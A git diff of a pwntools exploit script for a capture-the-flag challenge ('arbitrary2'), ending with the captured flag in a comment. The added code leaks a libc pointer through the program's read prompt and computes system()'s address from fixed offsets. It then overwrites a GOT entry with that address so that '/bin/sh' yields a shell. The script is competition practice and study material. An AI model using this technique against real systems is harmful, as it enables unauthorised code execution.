@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 from pwn import *
-from ctypes import CDLL
 
 context.terminal = ["tmux", "splitw", "-h"]
 # context.log_level = 'error' # se non vuoi vedere i loggin
-exe = context.binary = ELF(args.EXE or './<binary>')
-lib = CDLL(exe.libc.path)
-host = args.HOST or '<host>.chall.srdnlen.it'
+exe = context.binary = ELF(args.EXE or './arbitrary2')
+
+host = args.HOST or 'arbitrary2.chall.srdnlen.it'
 port = int(args.PORT or 443)
 
 
@@ -39,7 +38,24 @@ continue
 
 # -- Exploit goes here --
 
+pos = [0x60100]
+syste = [0x58750, 0x58750]
+addr = b"0x404018"
+change = b"0x404000"
 io = start()
+
+io.sendlineafter(b"> ", b"/bin/sh")
+io.sendlineafter(b"> ", addr)
+tochange = int(io.recvline().decode().strip().split(" ")[-1], 16)
+addr = tochange - pos[0] + syste[0]
+print(tochange)
+print(hex(addr).encode())
+print(io.recvline())
+
+io.sendlineafter(b"> ", change)
+io.sendlineafter(b"> ", hex(addr).encode())
+io.recvline()
 
 io.interactive()
 
+# srdnlen{R3AD_wR173_wHa7_WH3r3}
